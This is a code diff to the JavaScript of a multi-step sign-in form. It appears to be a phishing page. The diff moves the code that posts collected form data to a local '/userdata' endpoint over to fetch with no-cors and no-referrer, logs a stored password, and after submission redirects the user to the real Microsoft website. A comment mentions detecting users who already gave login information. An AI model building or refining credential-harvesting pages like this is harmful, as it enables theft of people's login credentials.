@@ -8,24 +8,33 @@ const btnNext = document.querySelector(".firstNext");
 const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
-function sendData( data ) {
+// Make sure this points to your API
+const API_URL = 'http://127.0.0.1:5000';
 
-  const XHR = new XMLHttpRequest();
-
+const createBody = (data) => {
   let urlEncodedData = "",
-      urlEncodedDataPairs = [],
-      name;
+  urlEncodedDataPairs = [],
+  name;
 
-  for( name in data ) {
-    console.log(data[name]);
+  for ( name in data ) {
     urlEncodedDataPairs.push( encodeURIComponent( name ) + '=' + encodeURIComponent( data[name] ) );
   }
 
   urlEncodedData = urlEncodedDataPairs.join( '&' ).replace( /%20/g, '+' );
-  XHR.open( 'POST', 'http://127.0.0.1:5000/userdata' );
-  XHR.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
-  XHR.send( urlEncodedData );
+
+  return urlEncodedData;
 }
+
+const sendData = ( data ) => fetch(`${API_URL}/userdata`, {
+  method: 'POST',
+  mode: 'no-cors',
+  cache: 'no-cache',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+  },
+  referrerPolicy: 'no-referrer',
+  body: createBody(data),
+})
 
 function validateEmail(email) {
   const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
@@ -127,11 +136,12 @@ submitBtn.addEventListener("click", function(){
   // set session item to indicate if user is allready giving login information. if is redirect user to somewere.
   sessionStorage.setItem("secsession", false);
 
+  console.log('from session storage', sessionStorage.getItem('password'))
   setTimeout(function(){
     //alert("Your Form Successfully Signed up");
     window.location.href = "https://www.microsoft.com/";
     //location.reload();
-  },0);
+  },10);
 });
 
 prevBtnSec.addEventListener("click", function(){
